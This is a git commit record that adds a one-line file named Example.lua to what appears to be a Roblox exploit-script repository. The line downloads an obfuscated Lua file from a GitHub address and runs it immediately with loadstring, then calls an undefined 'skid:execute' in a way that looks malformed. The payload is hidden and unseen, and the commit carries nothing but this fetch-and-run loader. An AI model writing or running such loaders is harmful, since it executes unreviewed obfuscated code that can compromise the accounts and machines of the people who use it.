f8f222675afbd9ca7a04c5a74b3eef78fbe6448c
Ehehhdrhdhehehhehendducucuh <142185912+Ehehhdrhdhehehhehendducucuh@users.noreply.github.com>
2024-12-30 12:39:12 +0800

    Create Example.lua

---
+++ Example.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ehehhdrhdhehehhehendducucuh/Skidd/refs/heads/main/obf_49lwzfWL895OLLJqoC9l8FX82IF55da1YCAu9d5tu3zg7L10t1bbS4jx5F76dH5F.lua.txt"))()skid:execute("Script1")
